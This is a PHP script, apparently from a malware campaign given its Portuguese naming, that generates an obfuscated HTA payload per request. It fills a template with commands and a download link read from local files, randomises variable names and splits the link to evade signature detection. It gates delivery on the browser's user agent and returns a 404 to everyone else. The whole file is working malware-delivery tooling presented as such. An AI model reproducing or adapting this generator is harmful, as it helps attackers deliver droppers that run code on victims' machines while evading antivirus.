<?php

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

$user_agent = " .net ";


if (strpos($user_agent, ".net") > 0 || strpos($user_agent, "msie") > 0) {

    header('Content-Type: text/plain;');

    //////////////////////////////////////////
    //////////////////////////////////////////

    function randStringW2($size)
    {
        $basic = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        $basic2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $return = $basic[rand(0, strlen($basic) - 1)];
        $size = rand($size, $size + 4);
        for ($count = 0; $size > $count; $count++) {
            $return .= $basic2[rand(0, strlen($basic2) - 1)];
        }
        return $return;
    }



    function  geraNomesVariaveis($qt)
    {
        $sNomeVar = "";
        $wlista = array();

        for ($i = 0; $i <= $qt; $i++) {
            do {
                $bNovo = true;
                $sNomeVar = randStringW2(2) . rand(1, 99);

                for ($i2 = 0; $i2 < count($wlista); $i2++) {
                    if ($wlista[$i2] == $sNomeVar) {
                        $bNovo = false;
                        break;
                    }
                }
            } while ($bNovo = false);

            $wlista[count($wlista)] = $sNomeVar;
        }

        return $wlista;
    }

    function randNome($size)
    {
        $return = "";
        $return .= randStringW2(5);
        if ((rand(1, 3)) == 1) {
            $return .= "/";
        }
        $return .= randStringW2(5);
        if ((rand(1, 3)) == 1) {
            $return .= "/";
        }
        $return .= randStringW2(5);
        if ((rand(1, 3)) == 1) {
            $return .= "/";
        }
        $basic1 = 'AB89';
        $basic2 = 'ABCDEF0123456789';
        $size = rand($size, $size + 3);
        for ($count = 0; $size > $count; $count++) {
            $return .= "%E" . rand(4, 9) . "%";

            $return .= $basic1[rand(0, strlen($basic1) - 1)];
            $return .= $basic2[rand(0, strlen($basic2) - 1)];
            $return .= "%";
            $return .= $basic1[rand(0, strlen($basic1) - 1)];
            $return .= $basic2[rand(0, strlen($basic2) - 1)];


            if ((rand(1, 10)) == 5) {
                $return .= "/";
            }
        }
        return $return;
    }






    $listaVar2 = geraNomesVariaveis(20);






    function inserechar($s)
    {
        return $s;
        if (!is_string($s) || $s === '') {
            return '';
        }

        $return = '';
        $len = strlen($s);

        for ($count = 0; $count < $len; $count++) {
            $return .= $s[$count];

            if (rand(1, 6) === 2) {
                $return .= '@';
            }
        }

        return $return;
    }

    /////////GERA HTA/////////////


   $sHTA = (file_get_contents("padraoHTA.txt"));

    if (substr($sHTA, 0, 3) == "\xef\xbb\xbf") {
       $sHTA = substr($sHTA, 3);
    }

    
    $fileConstsPadrao = (file_get_contents("consts.txt"));
    $fileConstsPadrao = str_replace("\r", "", $fileConstsPadrao);
    $fileConstsPadrao = explode("\n", $fileConstsPadrao);


    $link = $fileConstsPadrao[0];


    $cmd = $fileConstsPadrao[3];
    $cmd2 = $fileConstsPadrao[6];
    $cmd21 = $fileConstsPadrao[11];
    $cmd3 = $fileConstsPadrao[12];
    $cmd4 = $fileConstsPadrao[13];

    for ($i = 0; $i < 10; $i++) {
        $cmd = str_replace("%varC" . $i . "%", $listaVar2[$i], $cmd);
        $cmd2 = str_replace("%varC" . $i . "%", $listaVar2[$i], $cmd2);
        $cmd3 = str_replace("%varC" . $i . "%", $listaVar2[$i], $cmd3);
        $cmd4 = str_replace("%varC" . $i . "%", $listaVar2[$i], $cmd4);
        $cmd21 = str_replace("%varC" . $i . "%", $listaVar2[$i], $cmd21);
    }



    $link = str_replace(".", '"+' . $listaVar2[1] . '+"', $link);

    $cmd3 = str_replace("%link%", $link, $cmd3);
    $cmd3 = str_replace("%icontador%", $fileConstsPadrao[16], $cmd3);

    $cmd = inserechar($cmd);
    $cmd2 = inserechar($cmd2);
    $cmd3 = inserechar($cmd3);
    $cmd4 = inserechar($cmd4);
    $cmd21 = inserechar($cmd21);

    $cmd = str_replace('"', '""', $cmd);
    $cmd2 = str_replace('"', '""', $cmd2);
    $cmd3 = str_replace('"', '""', $cmd3);
    $cmd4 = str_replace('"', '""', $cmd4);
    $cmd21 = str_replace('"', '""', $cmd21);



    for ($i = 0; $i < 10; $i++) {
        $sHTA = str_replace("%var" . $i . "%", $listaVar2[$i], $sHTA);
    }



    $sHTA = str_replace("%const2%", inserechar($fileConstsPadrao[1]), $sHTA);


    $sHTA = str_replace("%const4%", $cmd, $sHTA);
    $sHTA = str_replace("%const7%", $cmd2, $sHTA);
    $sHTA = str_replace("%const8%", inserechar($fileConstsPadrao[7]), $sHTA);
    $sHTA = str_replace("%const9%", inserechar($fileConstsPadrao[8]), $sHTA);

    $sHTA = str_replace("%const10%", inserechar($fileConstsPadrao[9]), $sHTA);
    $sHTA = str_replace("%const11%", inserechar($fileConstsPadrao[10]), $sHTA);

    $sHTA = str_replace("%const12%", $cmd21, $sHTA);
    $sHTA = str_replace("%const13%", $cmd3, $sHTA);
    $sHTA = str_replace("%const14%", $cmd4, $sHTA);
    $sHTA = str_replace("%randi1%", (string)(rand(5000, 2000)), $sHTA);
    $sHTA = str_replace("%randi2%", (string)(rand(5000, 2000)), $sHTA);

    $sHTA = str_replace("%rand2%", randStringW2(100), $sHTA);
    $sHTA = str_replace("%rand1%", randStringW2(100), $sHTA);

    $sHTA = str_replace("%link%", $link, $sHTA);
    header('Content-Type: text/plain;');

    echo $sHTA;
} else {

    header('Content-Type: text/plain;');
    header("HTTP/1.0 404 Not Found");
}
